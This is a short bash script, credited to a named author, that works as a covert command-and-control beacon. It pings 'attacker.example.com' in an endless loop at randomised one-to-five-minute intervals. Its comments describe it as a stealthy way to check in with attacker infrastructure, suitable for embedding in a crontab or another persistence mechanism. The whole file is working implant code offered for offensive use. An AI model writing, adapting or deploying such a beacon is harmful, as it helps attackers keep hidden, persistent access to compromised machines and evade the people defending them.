#!/bin/bash

# Covertly ping a controlled domain/IP to check in with C2
# Can be embedded in a crontab or persistence method
# Intended to blend in and fly under the radar — great for initial beaconing.
# Author: Viral Maniar

TARGET="attacker.example.com"

while true; do
  ping -c 1 $TARGET > /dev/null 2>&1
  sleep $((RANDOM % 300 + 60))  # Random sleep between 1–5 minutes
done
